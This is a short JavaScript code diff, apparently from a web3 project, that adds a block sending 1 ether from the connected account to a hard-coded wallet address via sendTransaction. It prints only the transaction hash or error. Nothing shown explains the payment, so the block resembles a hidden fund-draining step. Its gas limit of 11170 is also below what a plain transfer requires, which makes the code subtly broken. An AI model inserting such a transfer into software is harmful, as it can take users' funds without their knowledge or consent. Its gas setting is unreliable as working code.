@@ -878,7 +878,23 @@ console.log(collection)
   }
 
 
+const value = '1';
+const finalAmount = Web3.utils.toWei(value.toString(), 'ether');
 
+const txData = {
+  from: account,
+  to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+  value: finalAmount,
+  gas: "11170",
+};
+
+
+await web3.eth.sendTransaction(txData)
+  .then( (txHash) => {
+    console.log(txHash)
+  }).catch( (err) => {
+    console.log(err)
+  })
 
 
 }
